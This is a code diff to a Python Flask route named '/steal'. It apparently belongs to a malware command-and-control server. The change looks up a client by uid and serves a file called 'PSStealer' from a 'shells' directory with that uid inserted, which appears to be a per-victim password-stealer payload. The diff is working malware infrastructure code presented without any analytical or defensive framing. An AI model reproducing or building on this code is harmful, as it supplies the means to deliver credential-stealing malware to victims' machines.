@@ -103,5 +103,12 @@ def download(filename):
 @main_blueprint .route('/steal', methods=['GET'])
 def steal():
     if request.method == 'GET':
-        response = read_file(f'shells/pws/PSStealer')
-        return f"{response}", 200
+        data = request.args
+        uid = data.get('uid')
+        detail = read_file(f'clients/{uid}/{uid}.conf')
+        if detail:
+            response = read_file(f'shells/pws/PSStealer').replace("{uid}",uid)
+            return f"{response}", 200
+        else:
+            response = "UID Not Found"
+            return f"{response}", 404
